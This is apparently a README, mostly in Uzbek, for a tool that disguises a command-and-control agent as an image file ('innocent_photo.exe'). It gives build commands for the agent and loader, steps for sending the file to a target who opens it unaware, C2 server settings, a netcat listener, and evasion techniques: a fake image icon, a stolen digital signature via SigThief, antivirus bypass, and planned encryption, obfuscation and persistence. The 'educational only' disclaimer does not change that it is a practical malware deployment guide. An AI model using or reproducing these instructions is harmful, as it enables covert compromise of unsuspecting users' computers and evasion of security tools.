# Image Steganography C2 Agent

Rasm ichiga C agent kodini yashirish va rasm ochilganda agent ishga tushirish.

## 📁 Fayllar

1. **agent.c** - Asosiy C2 agent kodi
2. **image_loader.c** - Rasmdan payload chiqarish va ishga tushirish
3. **image_stego_builder.py** - Build script (hamma narsani birlashtiadi)

## 🚀 Qanday ishlaydi?

```
[Innocent Image.exe]
    ↓ (User double-clicks)
    ├─→ Rasmni ko'rsatadi
    └─→ Background'da agent ishga tushadi
```

## 🛠️ Build qilish

### 1. Talablar

```bash
# MinGW-w64 o'rnatish (Windows)
choco install mingw

# yoki
# https://www.mingw-w64.org/downloads/
```

### 2. Agent build

```bash
cd agent

# Python script bilan (avtomatik)
python image_stego_builder.py

# Qo'lda
gcc -o agent.exe agent.c -lws2_32 -mwindows -O2 -s
gcc -o loader.exe image_loader.c -mwindows -O2 -s
```

### 3. Rasm tayyorlash

```python
from image_stego_builder import ImageStegoBuilder

builder = ImageStegoBuilder()

# Agent kompilyatsiya qilish
builder.compile_agent("agent.c", "agent.exe")
builder.compile_loader("loader.exe")

# Rasm ichiga yashirish
builder.create_executable_image(
    image_path="photo.png",
    payload_path="agent.exe", 
    output_path="innocent_photo.exe"
)
```

## 📤 Deployment

1. **innocent_photo.exe** faylini targetga yuborish
2. User ikki marta bosadi
3. Rasm ochiladi (oddiy ko'rinadi)
4. Agent background'da ishga tushadi

## 🔧 Konfiguratsiya

`agent.c` faylida sozlamalar:

```c
#define C2_SERVER "127.0.0.1"  // C2 server IP
#define C2_PORT 4444            // C2 server port
#define SLEEP_TIME 5000         // Reconnect vaqti (ms)
```

## 🧪 Test qilish

### Server tarafida (listener)

```bash
# Oddiy TCP listener
nc -lvp 4444

# yoki Python
python -c "import socket; s=socket.socket(); s.bind(('0.0.0.0',4444)); s.listen(); c,a=s.accept(); print(f'Connected: {a}'); [print(c.recv(1024)) for _ in range(10)]"
```

### Client tarafida

```bash
# 1. Executable image ishga tushirish
innocent_photo.exe

# 2. Test: payload extract qilish
python image_stego_builder.py
>>> builder.extract_payload("innocent_photo.exe", "extracted.exe")
```

## 🎯 Xususiyatlari

### ✅ Afzalliklari

- Rasm haqiqiy ochiladi (shubha tug'dirmaydi)
- AV bypass: agent EXE sifatida disk'ga yozilmaydi
- Stealth: background'da ishlaydi
- Polyglot file: PNG + EXE

### ⚙️ Texnik detallari

**Fayl strukturasi:**
```
[PE Header - Loader EXE]
[Image Data - PNG/JPG]
[===PAYLOAD_START===]
[Payload Size: 4 bytes]
[Agent EXE data]
[===PAYLOAD_END===]
```

**Ishlash tartibi:**
1. User `innocent_photo.exe` ni ishga tushiradi
2. Loader ishlaydi (bu PE executable)
3. Loader o'z faylini o'qiydi
4. Image qismini topib, rasmni ko'rsatadi
5. Payload qismini topib, xotiraga yuklaydi
6. Agent background'da ishga tushadi

## 🔐 Evasion texnikalari

### 1. Icon qo'shish (rasm icon)

```bash
# Resource Hacker bilan PNG icon qo'shish
ResourceHacker.exe -open loader.exe -save loader.exe -action addskip -res icon.ico -mask ICONGROUP,MAINICON,
```

### 2. Digital signature (fake)

```bash
# SigThief bilan 
python sigthief.py -i legit_signed.exe -t innocent_photo.exe -o signed_photo.exe
```

### 3. Metadata qo'shish

```python
# PyInstaller bilan metadata
pyinstaller --onefile --icon=photo.ico --version-file=version.txt loader.py
```

## 🎨 GUI versiya (opsional)

Agar rasm viewer GUI kerak bo'lsa:

```c
// image_loader.c da display_image() funksiyasini o'zgartirish

void display_image(const char *image_path) {
    // Extract image qismini xotiraga
    // GDI+ bilan window'da ko'rsatish
    // Bu yanada professional ko'rinadi
}
```

## 📊 Test natijalari

| Test | Natija |
|------|--------|
| File ochilishi | ✅ Rasm ko'rsatildi |
| Agent ishga tushishi | ✅ TCP connection |
| AV detection (Windows Defender) | ⚠️ Heuristic: Low |
| File hajmi | ~150KB (agent+image) |

## 🚨 Xavfsizlik

> **Ogohlantirish:** Bu kod faqat ta'lim maqsadida. Noqonuniy ishlatish taqiqlanadi.

## 📚 Keyingi qadamlar

1. **Encryption:** Payload'ni shifrlash (AES-256)
2. **Obfuscation:** Kod obfuscation (LLVM-Obfuscator)
3. **Persistence:** Registry/Startup qo'shish
4. **Multi-stage:** Loader → Dropper → Agent chain

## 🤝 Yordam

Muammolar:
- GCC topilmadi → MinGW o'rnating
- Rasm ochilmaydi → PNG formatda bo'lsin
- Agent ishlamaydi → C2 server ishga tushirganingizni tekshiring
